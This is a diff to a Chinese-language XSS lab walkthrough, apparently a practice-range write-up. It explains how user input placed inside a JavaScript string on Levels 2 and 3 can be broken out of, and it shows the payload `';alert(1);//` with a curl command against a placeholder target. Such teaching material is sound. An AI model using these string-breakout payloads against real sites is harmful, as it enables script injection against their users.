@@ -138,35 +138,55 @@ curl -s "http://TARGET/level2?username=test"
 
 **源码逻辑**：
 
+Level 2 服务端模板中的代码：
+
 ```javascript
-var username = 'USER_INPUT';  // 服务端直接注入到 JS 字符串
+var username = '...';  // 用户输入被填入单引号之间
 document.getElementById('ccc').innerHTML = "Welcome " + escape(username);
+```
+
+正常访问 `?username=xss` 时，服务端将 `xss` 填入单引号中间：
+
+```javascript
+var username = 'xss';  // 正常：xss 作为字符串值
+```
+
+攻击时，在输入中放入单引号 `'` 来提前闭合字符串：
+
+```
+攻击 payload: ?username=';alert(1);//
+```
+
+服务端模板照原样拼接后变为：
+
+```javascript
+var username = '';alert(1);//';  // ' 闭合 → ; 结束语句 → alert 执行 → // 注释掉后面的 '
 ```
 
 **推理链**：
 
 ```
-线索：username 注入到 JS 字符串 var username = '...' 中
+线索：服务端把用户输入直接填入 JS 字符串 var username = '...' 中
   ↓
-假设：可以用 ' 闭合字符串，注入任意 JS 代码
+假设：输入单引号 ' 可以闭合字符串，注入任意 JS 代码
   ↓
 验证：curl "?username=';alert(1);//"
   ↓
 结果：var username = '';alert(1);//'; — 成功注入！
   ↓
-结论：没有任何过滤/转义 ✅
+结论：服务端对单引号没有做任何转义（不会变成 \'）✅
 ```
 
-`escape()` 函数只对 innerHTML 中的内容做 URL 编码，不影响 JS 代码执行。
+>`escape()` 函数只对 innerHTML 中的内容做 URL 编码（比如 `<` → `%3C`），不影响 JS 代码本身。单引号 `'` 对 `escape()` 来说不需要编码，原样保留，导致字符串被闭合。
 
 ## Level 3：JS 字符串 → innerHTML（无 escape）
 
 **源码逻辑**：
 
 ```javascript
-var username = 'USER_INPUT';  // 注入到 JS 字符串
+var username = '...';  // 用户输入填入单引号之间
 document.getElementById('ccc').innerHTML = "Welcome " + username;
-// 没有 escape() 包裹！
+// 与 Level 2 区别：innerHTML 拼入 username 时没有 escape() 包裹！
 ```
 
 **推理链**：
